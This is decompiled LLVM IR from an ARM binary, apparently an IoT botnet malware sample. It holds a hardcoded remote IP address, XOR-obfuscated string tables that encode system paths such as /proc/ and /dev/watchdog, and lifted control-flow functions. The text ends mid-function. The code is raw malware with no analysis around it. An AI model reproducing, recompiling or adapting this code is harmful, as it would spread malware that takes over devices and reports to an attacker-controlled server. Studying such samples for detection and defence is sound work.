source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_d8f0.14 = constant i32 -382906384
@global_var_1e9d4.19 = global i32 0
@global_var_82dc.20 = constant i32 -352321547
@global_var_128a8.21 = constant i32 -382909968
@global_var_bd54.27 = constant i32 -382906384
@global_var_c18c.29 = constant i32 -382906384
@global_var_b5c8.31 = constant i32 -382906384
@global_var_af1c.33 = constant i32 -382906384
@global_var_a824.35 = constant i32 -382906384
@global_var_a070.37 = constant i32 -382906384
@global_var_9000.40 = constant i32 -382906384
@global_var_896c.42 = constant i32 -382906384
@global_var_961c.44 = constant i32 -382906384
@global_var_20a5c.46 = global i32 0
@global_var_20a64.58 = global i32 0
@global_var_1617c.60 = constant i32 47
@global_var_1e9d8.63 = global i32 0
@global_var_20a60.65 = global i32 0
@global_var_10ba8.67 = constant i32 -382910336
@global_var_d7b8.69 = constant i32 -382910448
@global_var_16180.75 = constant [15 x i8] c"212.237.54.173\00"
@global_var_20a6c.78 = local_unnamed_addr global i32 0
@global_var_20a6a.79 = local_unnamed_addr global i32 0
@global_var_1e9dc.81 = global i32 0
@global_var_16190.89 = constant i32 10
@global_var_10ddc.95 = constant i32 -382910336
@global_var_16194.99 = constant i32 16777216
@global_var_1e9e4.101 = global i32 0
@global_var_1e9f0.103 = global i32 0
@global_var_1e9e8.105 = global i32 0
@global_var_1e9ec.107 = global i32 0
@global_var_1ea28.121 = global i32 0
@global_var_1e9f4.123 = global i32 0
@global_var_1ea20.125 = global i32 0
@global_var_20a80.129 = global i32 0
@global_var_20a78.133 = global i32 0
@global_var_20a7c.135 = global i32 0
@global_var_1e9fa.138 = local_unnamed_addr global i32 0
@global_var_1e9fc.142 = local_unnamed_addr global i32 0
@global_var_1ea00.143 = local_unnamed_addr global i32 0
@global_var_1ea01.144 = local_unnamed_addr global i32 0
@global_var_1ea1a.147 = local_unnamed_addr global i32 0
@global_var_161a0.149 = constant i32 0
@global_var_1619c.151 = constant [5 x i8] c"&;; \00"
@global_var_161a4.153 = constant [5 x i8] c"5:?;\00"
@global_var_161ac.155 = constant [9 x i8] c"<!: acam\00"
@global_var_161b8.157 = constant [7 x i8] c" 18:1 \00"
@global_var_161c0.159 = constant [8 x i8] c"0125!8 \00"
@global_var_161c8.161 = constant [9 x i8] c"$5''#;&0\00"
@global_var_161d4.163 = constant [6 x i8] c"509=:\00"
@global_var_161dc.165 = constant [6 x i8] c"\22=.,\22\00"
@global_var_161e4.167 = constant [8 x i8] c"'!$$;& \00"
@global_var_161ec.169 = constant i32 423502179
@global_var_161fc.171 = constant [6 x i8] c"efg`a\00"
@global_var_16204.173 = constant [5 x i8] c"!'1&\00"
@global_var_1620c.175 = constant i32 943467547
@global_var_16218.177 = constant i32 322070023
@global_var_1ea04.178 = local_unnamed_addr global i32 0
@global_var_1ea02.179 = local_unnamed_addr global i32 0
@global_var_1ea08.180 = local_unnamed_addr global i32 0
@global_var_1ea10.182 = local_unnamed_addr global i32 0
@global_var_1ea1c.183 = local_unnamed_addr global i32 0
@global_var_e328.185 = constant i32 -382910352
@global_var_16224.187 = constant [3 x i8] c"\0D\0A\00"
@global_var_16230.189 = constant i32 2096127
@global_var_16227.191 = constant i32 2095871
@global_var_20a88.197 = global i32 0
@global_var_16234.204 = constant [3 x i8] c"Qm\00"
@global_var_20a90.205 = local_unnamed_addr global i32 0
@global_var_20a94.206 = local_unnamed_addr global i32 0
@global_var_16238.208 = constant [16 x i8] c"fefzfgcza`zecgT\00"
@global_var_20a98.209 = local_unnamed_addr global i32 0
@global_var_20a9c.210 = local_unnamed_addr global i32 0
@global_var_20aa0.211 = local_unnamed_addr global i32 0
@global_var_20aa4.212 = local_unnamed_addr global i32 0
@global_var_16248.214 = constant i32 59987
@global_var_20aa8.215 = local_unnamed_addr global i32 0
@global_var_20aac.216 = local_unnamed_addr global i32 0
@global_var_163c8.218 = constant i32 808465680
@global_var_20ab4.219 = local_unnamed_addr global i32 0
@global_var_20ab0.220 = local_unnamed_addr global i32 0
@global_var_1624c.222 = constant [7 x i8] c"'<188T\00"
@global_var_20ab8.223 = local_unnamed_addr global i32 0
@global_var_20abc.224 = local_unnamed_addr global i32 0
@global_var_16254.226 = constant [8 x i8] c"1:5681T\00"
@global_var_20ac0.227 = local_unnamed_addr global i32 0
@global_var_20ac4.228 = local_unnamed_addr global i32 0
@global_var_1625c.230 = constant [8 x i8] c"'-' 19T\00"
@global_var_20ac8.231 = local_unnamed_addr global i32 0
@global_var_20acc.232 = local_unnamed_addr global i32 0
@global_var_16264.234 = constant [4 x i8] c"'<T\00"
@global_var_20ad4.235 = local_unnamed_addr global i32 0
@global_var_20ad0.236 = local_unnamed_addr global i32 0
@global_var_16268.238 = constant i32 977090171
@global_var_20adc.239 = local_unnamed_addr global i32 0
@global_var_20ad8.240 = local_unnamed_addr global i32 0
@global_var_1627c.242 = constant i32 470227742
@global_var_20ae4.243 = local_unnamed_addr global i32 0
@global_var_20ae0.244 = local_unnamed_addr global i32 0
@global_var_16298.246 = constant [10 x i8] c":7;&&17 T\00"
@global_var_20aec.247 = local_unnamed_addr global i32 0
@global_var_20ae8.248 = local_unnamed_addr global i32 0
@global_var_162a4.250 = constant [17 x i8] c"{6=:{6!'-6;,t$'T\00"
@global_var_20af0.251 = local_unnamed_addr global i32 0
@global_var_20af4.252 = local_unnamed_addr global i32 0
@global_var_162b8.254 = constant [23 x i8] c"{6=:{6!'-6;,t?=88tymtT\00"
@global_var_20afc.255 = local_unnamed_addr global i32 0
@global_var_20af8.256 = local_unnamed_addr global i32 0
@global_var_162d0.258 = constant [8 x i8] c"{$&;7{T\00"
@global_var_20b00.259 = local_unnamed_addr global i32 0
@global_var_20b04.260 = local_unnamed_addr global i32 0
@global_var_162d8.262 = constant [6 x i8] c"{1,1T\00"
@global_var_20b08.263 = local_unnamed_addr global i32 0
@global_var_20b0c.264 = local_unnamed_addr global i32 0
@global_var_162e0.266 = constant [5 x i8] c"{20T\00"
@global_var_20b14.267 = local_unnamed_addr global i32 0
@global_var_20b10.268 = local_unnamed_addr global i32 0
@global_var_162e8.270 = constant [7 x i8] c"{95$'T\00"
@global_var_20b18.271 = local_unnamed_addr global i32 0
@global_var_20b1c.272 = local_unnamed_addr global i32 0
@global_var_162f0.274 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_20b20.275 = local_unnamed_addr global i32 0
@global_var_20b24.276 = local_unnamed_addr global i32 0
@global_var_16300.278 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_20b88.279 = local_unnamed_addr global i32 0
@global_var_1630c.281 = constant [8 x i8] c"z5:=91T\00"
@global_var_20b90.282 = local_unnamed_addr global i32 0
@global_var_16314.284 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_20b28.285 = local_unnamed_addr global i32 0
@global_var_20b2c.286 = local_unnamed_addr global i32 0
@global_var_16328.288 = constant [24 x i8] c"3e567`09;ga<:$f8=1d?>2T\00"
@global_var_20b30.289 = local_unnamed_addr global i32 0
@global_var_20b34.290 = local_unnamed_addr global i32 0
@global_var_16340.292 = constant [9 x i8] c"5''#;&0T\00"
@global_var_20b38.293 = local_unnamed_addr global i32 0
@global_var_20b3c.294 = local_unnamed_addr global i32 0
@global_var_163e8.296 = constant i32 557516544
@global_var_20b44.297 = local_unnamed_addr global i32 0
@global_var_20b40.298 = local_unnamed_addr global i32 0
@global_var_1634c.300 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_20b4c.301 = local_unnamed_addr global i32 0
@global_var_20b48.302 = local_unnamed_addr global i32 0
@global_var_16360.304 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_20b54.305 = local_unnamed_addr global i32 0
@global_var_20b50.306 = local_unnamed_addr global i32 0
@global_var_16370.308 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_20b58.309 = local_unnamed_addr global i32 0
@global_var_20b5c.310 = local_unnamed_addr global i32 0
@global_var_16380.312 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_20b64.313 = local_unnamed_addr global i32 0
@global_var_20b60.314 = local_unnamed_addr global i32 0
@global_var_16394.316 = constant [9 x i8] c"$662*7!E\00"
@global_var_20b68.317 = local_unnamed_addr global i32 0
@global_var_20b6c.318 = local_unnamed_addr global i32 0
@global_var_163a0.320 = constant [6 x i8] c";3=:T\00"
@global_var_20b70.321 = local_unnamed_addr global i32 0
@global_var_20b74.322 = local_unnamed_addr global i32 0
@global_var_163a8.324 = constant [7 x i8] c"1: 1&T\00"
@global_var_20b78.325 = local_unnamed_addr global i32 0
@global_var_20b7c.326 = local_unnamed_addr global i32 0
@global_var_163b0.328 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_20b84.329 = local_unnamed_addr global i32 0
@global_var_20b80.330 = local_unnamed_addr global i32 0
@global_var_10ea0.336 = constant i32 -443088884
@global_var_f000.346 = constant i32 167772173
@global_var_1ea48.354 = global i32 0
@global_var_112dc.356 = constant i32 -456978431
@global_var_d0c8.368 = constant [3 x i8] c"%\0B\00"
@global_var_20b98.370 = global i32 0
@global_var_11898.376 = constant i32 -478871519
@global_var_c624.380 = constant i32 -481099730
@global_var_c4ec.387 = constant i32 -443744156
@global_var_12318.392 = constant i32 -478805983
@global_var_126f4.401 = constant i32 -382906384
@global_var_1ea2c.409 = local_unnamed_addr global i32 0
@global_var_1417c.411 = constant i32 -509591552
@global_var_1ea30.420 = local_unnamed_addr global i32 0
@global_var_14bb0.423 = constant i32 -382909968
@global_var_12f54.424 = constant i32 -494075872
@global_var_10da4.425 = constant i32 -382910336
@global_var_16418.429 = constant [11 x i8] c"/proc/stat\00"
@global_var_16424.432 = constant i32 32
@global_var_16428.435 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_16438.437 = constant [10 x i8] c"processor\00"
@global_var_1645c.439 = constant i32 604672
@global_var_13114.442 = constant i32 -369098421
@global_var_1ea40.455 = local_unnamed_addr global i32 0
@global_var_1ea44.457 = local_unnamed_addr global i32 0
@global_var_16460.460 = constant [10 x i8] c"/dev/null\00"
@global_var_12b24.461 = constant i32 -442543860
@global_var_14b14.466 = constant i32 -382910352
@global_var_11310.471 = constant i32 -369094618
@global_var_13ae0.484 = constant i32 -335545128
@global_var_13fa8.490 = constant i32 -382909456
@global_var_20a58.493 = local_unnamed_addr global i32 0
@global_var_16440.501 = constant i32 114
@global_var_14fd4.506 = constant i32 -382906384
@global_var_20003.515 = global i32 0
@global_var_20000.516 = global i32 0
@global_var_14ab4.526 = constant i32 -509607926
@global_var_1676c.531 = constant i32 0
@global_var_15f68.532 = constant i32 -382909968
@global_var_14df8.542 = constant i32 -509607928
@global_var_1e9b4.2 = external global i8*
@global_var_1e9d0.17 = external global i8*
@global_var_1e9d1.25 = global i8 0
@1 = internal constant [4 x i8] c"\14\E8\01\00"
@global_var_20a68.77 = global i16* null
@global_var_1e9e0.93 = external global i8*
@global_var_1ea24.127 = global i16* null
@global_var_1e9f8.137 = external global i8*
@global_var_1ea0c.140 = global i16 0
@global_var_1ea18.141 = local_unnamed_addr global i8 0
@global_var_1ea0e.145 = local_unnamed_addr global i16 0
@global_var_1ea19.146 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8094() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_8098)
  %v31_80a0 = load i32, i32* @r0, align 4
  ret i32 %v31_80a0
}

define i32 @function_80b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 ptrtoint (i8** @global_var_1e9b4.2 to i32), i32* @r4, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_1e9b4.2 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %dec_label_pc_80c4, label %dec_label_pc_80e0

dec_label_pc_80c4:                                ; preds = %entry
  store i1 true, i1* @cpsr_z, align 1
  %v3_80d4 = call i32 @function_80ec()
  %v2_80dc = load i32, i32* @r4, align 4
  %v3_80dc = inttoptr i32 %v2_80dc to i8*
  store i8 1, i8* %v3_80dc, align 1
  br label %dec_label_pc_80e0

dec_label_pc_80e0:                                ; preds = %entry, %dec_label_pc_80c4
  %.0 = phi i32 [ %v3_80d4, %dec_label_pc_80c4 ], [ undef, %entry ]
  ret i32 %.0

; uselistorder directives
  uselistorder i8** @global_var_1e9b4.2, { 1, 0 }
  uselistorder label %dec_label_pc_80e0, { 1, 0 }
}

define i32 @function_80ec() local_unnamed_addr {
dec_label_pc_80ec:
  %v0_80f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_80f0, label %bb, label %dec_label_pc_80ec._crit_edge

dec_label_pc_80ec._crit_edge:                     ; preds = %dec_label_pc_80ec
  br label %bb4

bb:                                               ; preds = %dec_label_pc_80ec
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_80ec._crit_edge, %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8118 = load i32, i32* inttoptr (i32 124816 to i32*), align 16
  %v2_811c = icmp eq i32 %v2_8118, 0
  br i1 %v2_811c, label %dec_label_pc_8134, label %dec_label_pc_8124

dec_label_pc_8124:                                ; preds = %bb4
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8134

dec_label_pc_8134:                                ; preds = %bb4, %dec_label_pc_8124
  ret i32 124816

; uselistorder directives
  uselistorder label %dec_label_pc_8134, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_815c = ptrtoint i32* %stack_var_4 to i32
  %v8_817c = call i32 @function_13850(i32 ptrtoint (i32* @global_var_d8f0.14 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 90476, i32 %arg1, i32 %v4_815c)
  %v0_8180 = call i32 @function_12b24()
  ret i32 %v0_8180
}

define i32 @function_8190(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8190:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_8190 = icmp eq i32 %arg1, 0
  br i1 %v2_8190, label %dec_label_pc_81d8, label %dec_label_pc_81a0

dec_label_pc_81a0:                                ; preds = %dec_label_pc_8190
  %v0_81a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81a0 = add i32 %v0_81a0, 4
  %v2_81a0 = inttoptr i32 %v1_81a0 to i8*
  %v3_81a0 = load i8, i8* %v2_81a0, align 1
  %v4_81a0 = zext i8 %v3_81a0 to i32
  %v9_81a4 = icmp eq i32 %v4_81a0, %arg3
  br i1 %v9_81a4, label %dec_label_pc_81e4, label %dec_label_pc_81c8.preheader

dec_label_pc_81c8.preheader:                      ; preds = %dec_label_pc_81a0
  br label %dec_label_pc_81c8

dec_label_pc_81b8:                                ; preds = %dec_label_pc_81c8
  %v1_81b8 = add i32 %v0_81c0.in, 12
  %v2_81b8 = inttoptr i32 %v1_81b8 to i8*
  %v3_81b8 = load i8, i8* %v2_81b8, align 1
  %v4_81b8 = zext i8 %v3_81b8 to i32
  %v9_81bc = icmp eq i32 %v4_81b8, %arg3
  br i1 %v9_81bc, label %dec_label_pc_81e4, label %dec_label_pc_81c8

dec_label_pc_81c8:                                ; preds = %dec_label_pc_81c8.preheader, %dec_label_pc_81b8
  %v0_81c0.in = phi i32 [ %v0_81a0, %dec_label_pc_81c8.preheader ], [ %v0_81c0, %dec_label_pc_81b8 ]
  %v0_81c8 = phi i32 [ 0, %dec_label_pc_81c8.preheader ], [ %v1_81c8, %dec_label_pc_81b8 ]
  %v0_81c0 = add i32 %v0_81c0.in, 8
  %v1_81c8 = add i32 %v0_81c8, 1
  %v9_81cc = icmp eq i32 %v1_81c8, %arg1
  store i32 %v0_81c0, i32* %r1.global-to-local, align 4
  br i1 %v9_81cc, label %dec_label_pc_81d8, label %dec_label_pc_81b8

dec_label_pc_81d8:                                ; preds = %dec_label_pc_81c8, %dec_label_pc_8190, %dec_label_pc_81e4
  %v0_81d8 = phi i32 [ %arg4, %dec_label_pc_8190 ], [ %v2_81e4, %dec_label_pc_81e4 ], [ %arg4, %dec_label_pc_81c8 ]
  ret i32 %v0_81d8

dec_label_pc_81e4:                                ; preds = %dec_label_pc_81b8, %dec_label_pc_81a0
  %v0_81e4 = phi i32 [ %v0_81a0, %dec_label_pc_81a0 ], [ %v0_81c0, %dec_label_pc_81b8 ]
  %v1_81e4 = inttoptr i32 %v0_81e4 to i32*
  %v2_81e4 = load i32, i32* %v1_81e4, align 4
  br label %dec_label_pc_81d8

; uselistorder directives
  uselistorder i32 %v1_81c8, { 1, 0 }
  uselistorder i32 %v0_81c0, { 1, 0, 2 }
  uselistorder i32 %v0_81c0.in, { 1, 0 }
  uselistorder i32 %v0_81a0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_81d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_81c8, { 1, 0 }
}

define i32 @function_81ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_81ec:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_81ec = load i32, i32* @r4, align 4
  store i32 %v3_81ec, i32* %stack_var_-32, align 4
  %v6_81ec = load i32, i32* @r5, align 4
  %v9_81ec = load i32, i32* @r6, align 4
  %v12_81ec = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  %v0_8204 = call i32 @function_10acc()
  store i32 %v0_8204, i32* @r0, align 4
  %v7_8208 = icmp eq i32 %v0_8204, -1
  %tmp23 = icmp slt i32 %v0_8204, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_81ec
  br label %dec_label_pc_8228

bb24:                                             ; preds = %dec_label_pc_81ec
  %. = zext i1 %v7_8208 to i32
  store i32 %., i32* @r5, align 4
  %v2_8220 = icmp eq i1 %v7_8208, false
  br i1 %v2_8220, label %dec_label_pc_8230, label %dec_label_pc_8228

dec_label_pc_8228:                                ; preds = %.thread2, %bb24
  %v2_8228 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_8228, i32* @r4, align 4
  store i32 %v6_81ec, i32* @r5, align 4
  store i32 %v9_81ec, i32* @r6, align 4
  store i32 %v12_81ec, i32* @r7, align 4
  ret i32 %v0_8204

dec_label_pc_8230:                                ; preds = %bb24
  %v0_8230 = call i32 @function_10acc()
  %v7_8234 = icmp eq i32 %v0_8230, -1
  store i32 %v0_8230, i32* @r4, align 4
  br i1 %v7_8234, label %dec_label_pc_8264, label %dec_label_pc_8240

dec_label_pc_8240:                                ; preds = %dec_label_pc_8230
  %v2_8240 = icmp eq i32 %v0_8230, 0
  br i1 %v2_8240, label %dec_label_pc_8248, label %dec_label_pc_826c

dec_label_pc_8248:                                ; preds = %dec_label_pc_8240
  %v0_8248 = load i32, i32* @r6, align 4
  %v1_824c = call i32 @function_12f00(i32 %v0_8248)
  store i32 %v1_824c, i32* @r0, align 4
  %v0_8250 = call i32 @function_109a0()
  %v2_8258 = call i32 @function_10ba8(i32 %v0_8250, i32 9)
  %v0_825c = load i32, i32* @r4, align 4
  %v1_8260 = call i32 @function_12e48(i32 %v0_825c)
  br label %dec_label_pc_8264

dec_label_pc_8264:                                ; preds = %dec_label_pc_8230, %dec_label_pc_8248
  %v0_8264 = load i32, i32* @r5, align 4
  %v1_8268 = call i32 @function_12e48(i32 %v0_8264)
  br label %dec_label_pc_826c

dec_label_pc_826c:                                ; preds = %dec_label_pc_8240, %dec_label_pc_8264
  %v2_8270 = load i8, i8* bitcast (i8** @global_var_1e9d0.17 to i8*), align 4
  %v3_8270 = zext i8 %v2_8270 to i32
  %v2_8274 = icmp eq i8 %v2_8270, 0
  br i1 %v2_8274, label %dec_label_pc_82b8, label %dec_label_pc_827c

dec_label_pc_827c:                                ; preds = %dec_label_pc_826c
  %v2_8280 = load i32, i32* @global_var_1e9d4.19, align 4
  %v1_8284 = inttoptr i32 %v2_8280 to i32*
  %v2_8284 = load i32, i32* %v1_8284, align 4
  store i32 %v2_8284, i32* @ip, align 4
  %v1_8288 = add i32 %v2_8284, 4
  %v2_8288 = inttoptr i32 %v1_8288 to i8*
  %v3_8288 = load i8, i8* %v2_8288, align 1
  %v4_8288 = zext i8 %v3_8288 to i32
  %v1_828c = load i32, i32* @r7, align 4
  %v9_828c = icmp eq i32 %v4_8288, %v1_828c
  br i1 %v9_828c, label %dec_label_pc_82c0, label %dec_label_pc_82ac.preheader

dec_label_pc_82ac.preheader:                      ; preds = %dec_label_pc_827c
  %v1_8290 = load i32, i32* @r5, align 4
  br label %dec_label_pc_82ac

dec_label_pc_829c:                                ; preds = %dec_label_pc_82ac
  %v4_829c = mul i32 %v1_82ac, 4
  %v5_829c = add i32 %v4_829c, %v2_8280
  %v6_829c = inttoptr i32 %v5_829c to i32*
  %v7_829c = load i32, i32* %v6_829c, align 4
  store i32 %v7_829c, i32* @ip, align 4
  %v1_82a0 = add i32 %v7_829c, 4
  %v2_82a0 = inttoptr i32 %v1_82a0 to i8*
  %v3_82a0 = load i8, i8* %v2_82a0, align 1
  %v4_82a0 = zext i8 %v3_82a0 to i32
  %v9_82a4 = icmp eq i32 %v4_82a0, %v1_828c
  br i1 %v9_82a4, label %dec_label_pc_82c0, label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_82ac.preheader, %dec_label_pc_829c
  %v0_82ac = phi i32 [ %v1_8290, %dec_label_pc_82ac.preheader ], [ %v1_82ac, %dec_label_pc_829c ]
  %v1_82ac = add i32 %v0_82ac, 1
  %v9_82b0 = icmp eq i32 %v1_82ac, %v3_8270
  br i1 %v9_82b0, label %dec_label_pc_82b8, label %dec_label_pc_829c

dec_label_pc_82b8:                                ; preds = %dec_label_pc_82ac, %dec_label_pc_826c, %dec_label_pc_82c0
  %v1_82bc = call i32 @function_12e48(i32 0)
  %v0_82d0.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_82c0

dec_label_pc_82c0:                                ; preds = %dec_label_pc_829c, %dec_label_pc_827c, %dec_label_pc_82b8
  %v0_82d0 = phi i32 [ %v2_8284, %dec_label_pc_827c ], [ %v0_82d0.pre, %dec_label_pc_82b8 ], [ %v7_829c, %dec_label_pc_829c ]
  %v1_82d0 = inttoptr i32 %v0_82d0 to i32*
  %v2_82d0 = load i32, i32* %v1_82d0, align 4
  store i32 %v2_82d0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_82d0)
  br label %dec_label_pc_82b8

; uselistorder directives
  uselistorder i32 %v1_82ac, { 2, 0, 1 }
  uselistorder i32 %v0_8230, { 1, 2, 0 }
  uselistorder i1 %v7_8208, { 1, 0 }
  uselistorder i32 %v0_8204, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_82c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82ac, { 1, 0 }
  uselistorder label %dec_label_pc_826c, { 1, 0 }
  uselistorder label %dec_label_pc_8264, { 1, 0 }
  uselistorder label %dec_label_pc_8228, { 1, 0 }
}

define i32 @function_82e8(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_82e8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_82e8 = load i32, i32* @r5, align 4
  %v9_82e8 = load i32, i32* @r6, align 4
  %v12_82e8 = load i32, i32* @r7, align 4
  %v18_82e8 = load i32, i32* @sb, align 4
  %v24_82e8 = load i32, i32* @fp, align 4
  %v2_82ec = icmp ugt i32 %arg2, 2
  %v7_82ec = icmp eq i32 %arg2, 3
  store i1 %v7_82ec, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_82f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_82f8, i32* @r5, align 4
  %v2_82fc = xor i1 %v7_82ec, true
  %v3_82fc = and i1 %v2_82ec, %v2_82fc
  br i1 %v3_82fc, label %dec_label_pc_830c, label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %dec_label_pc_834c, %.dec_label_pc_8300_crit_edge, %dec_label_pc_8340, %dec_label_pc_8330, %dec_label_pc_830c, %dec_label_pc_82e8, %dec_label_pc_84f8
  %v1_8308 = phi i32 [ %v1_8308.pre, %.dec_label_pc_8300_crit_edge ], [ %v1_8310, %dec_label_pc_834c ], [ %v1_8310, %dec_label_pc_8340 ], [ %v1_8310, %dec_label_pc_8330 ], [ %v1_8310, %dec_label_pc_830c ], [ %v0_82f8, %dec_label_pc_82e8 ], [ %v0_84fc, %dec_label_pc_84f8 ]
  store i32 %v6_82e8, i32* @r5, align 4
  store i32 %v9_82e8, i32* @r6, align 4
  store i32 %v12_82e8, i32* @r7, align 4
  store i32 %v18_82e8, i32* @sb, align 4
  store i32 %v24_82e8, i32* @fp, align 4
  ret i32 %v1_8308

dec_label_pc_830c:                                ; preds = %dec_label_pc_82e8
  %v1_830c = inttoptr i32 %v0_82f8 to i32*
  %v2_830c = load i32, i32* %v1_830c, align 4
  store i32 %v2_830c, i32* %r1.global-to-local, align 4
  %v1_8310 = and i32 %v2_830c, 16711680
  store i32 %v1_8310, i32* %r0.global-to-local, align 4
  %v3_8314 = udiv i32 %v2_830c, 16777216
  %v4_8318 = udiv i32 %v1_8310, 256
  %v5_8318 = or i32 %v4_8318, %v3_8314
  %v1_831c = and i32 %v2_830c, 65280
  store i32 %v1_831c, i32* %r2.global-to-local, align 4
  %v4_8320 = mul nuw nsw i32 %v1_831c, 256
  %v5_8320 = or i32 %v5_8318, %v4_8320
  store i32 %v5_8320, i32* %r3.global-to-local, align 4
  %v7_8324 = icmp eq i32 %arg2, 4
  store i1 %v7_8324, i1* %cpsr_z.global-to-local, align 1
  %v5_8328 = call i32 @llvm.bswap.i32(i32 %v2_830c)
  store i32 %v5_8328, i32* @fp, align 4
  br i1 %v7_8324, label %dec_label_pc_8300, label %dec_label_pc_8330

dec_label_pc_8330:                                ; preds = %dec_label_pc_830c
  %v1_8330 = add i32 %v0_82f8, 4
  %v2_8330 = inttoptr i32 %v1_8330 to i8*
  %v3_8330 = load i8, i8* %v2_8330, align 1
  %v4_8330 = zext i8 %v3_8330 to i32
  store i32 %v4_8330, i32* %r2.global-to-local, align 4
  %v7_8334 = icmp eq i32 %arg2, 5
  store i1 %v7_8334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8334, label %dec_label_pc_8300, label %dec_label_pc_8340

dec_label_pc_8340:                                ; preds = %dec_label_pc_8330
  %v1_8340 = add i32 %v0_82f8, 5
  %v2_8340 = inttoptr i32 %v1_8340 to i8*
  %v3_8340 = load i8, i8* %v2_8340, align 1
  %v4_8340 = zext i8 %v3_8340 to i32
  store i32 %v4_8340, i32* @sb, align 4
  %v2_8344 = icmp eq i8 %v3_8340, 0
  store i1 %v2_8344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8344, label %dec_label_pc_8300, label %dec_label_pc_834c

dec_label_pc_834c:                                ; preds = %dec_label_pc_8340
  %v2_8350 = mul nuw nsw i32 %v4_8340, 5
  store i32 %v2_8350, i32* @r7, align 4
  %v1_8354 = add i32 %arg2, -6
  store i32 %v1_8354, i32* %r3.global-to-local, align 4
  %v3_8358 = icmp ult i32 %v1_8354, %v2_8350
  %v9_8358 = icmp eq i32 %v1_8354, %v2_8350
  store i1 %v9_8358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8358, label %dec_label_pc_8300, label %dec_label_pc_8360

dec_label_pc_8360:                                ; preds = %dec_label_pc_834c
  store i32 %v4_8340, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8354, i32* @r6, align 4
  %v2_836c = call i32 @function_1215c(i32 %v4_8340, i32 24)
  store i32 %v2_836c, i32* @ip, align 4
  %v0_8378 = load i32, i32* @r7, align 4
  %v1_8378 = load i32, i32* @r4, align 4
  %v2_8378 = sub i32 %v1_8378, %v0_8378
  store i32 %v2_8378, i32* @r7, align 4
  %v0_837c = load i32, i32* @r5, align 4
  %v1_837c = add i32 %v0_837c, 11
  store i32 %v1_837c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8380, %dec_label_pc_8360
